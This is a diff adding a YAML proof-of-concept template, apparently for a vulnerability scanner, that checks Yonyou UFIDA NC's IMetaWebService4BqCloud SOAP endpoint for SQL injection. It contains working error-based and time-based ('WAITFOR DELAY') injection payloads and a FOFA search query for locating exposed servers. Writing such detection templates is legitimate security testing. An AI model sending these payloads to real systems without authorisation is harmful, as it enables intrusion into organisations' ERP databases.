@@ -1,0 +1,36 @@
+id: poc-yaml-yonyou-ufida-nc-imetawebservice4bqcloud-sqli
+info:
+  name: 用友NC IMetaWebService4BqCloud SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: ufida-nc
+  fofa: app="用友-UFIDA-NC"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /uapws/service/uap.pubitf.ae.meta.IMetaWebService4BqCloud
+  headers:
+    Content-Type: text/xml;charset=UTF-8
+  data: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:imet=\"http://meta.ae.pubitf.uap/IMetaWebService4BqCloud\">\n   <soapenv:Header/>\n\
+    \   <soapenv:Body>\n      <imet:loadFields>\n         <!--type: string-->\n  \
+    \       <imet:string>SmartModel^1'</imet:string>\n      </imet:loadFields>\n \
+    \  </soapenv:Body>\n</soapenv:Envelope>"
+  expression: status_code == 500 && contains(body,"Fault occurred while processing.")
+    && contains(body,"ufida.zior.exception") && contains(body,"IMetaWebService4BqCloud")
+    && contains(content_type,"text/xml")
+- method: POST
+  path: /uapws/service/uap.pubitf.ae.meta.IMetaWebService4BqCloud
+  headers:
+    Content-Type: text/xml;charset=UTF-8
+  data: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:imet=\"http://meta.ae.pubitf.uap/IMetaWebService4BqCloud\">\n   <soapenv:Header/>\n\
+    \   <soapenv:Body>\n      <imet:loadFields>\n         <!--type: string-->\n  \
+    \       <imet:string>SmartModel^1';WAITFOR DELAY '0:0:{{.t1}}'--</imet:string>\n\
+    \      </imet:loadFields>\n   </soapenv:Body>\n</soapenv:Envelope>"
+  expression: status_code == 200 && contains(body,"#UAP#") && contains(content_type,"text/xml")
+    && duration > t1 && duration < t2
+transport: http
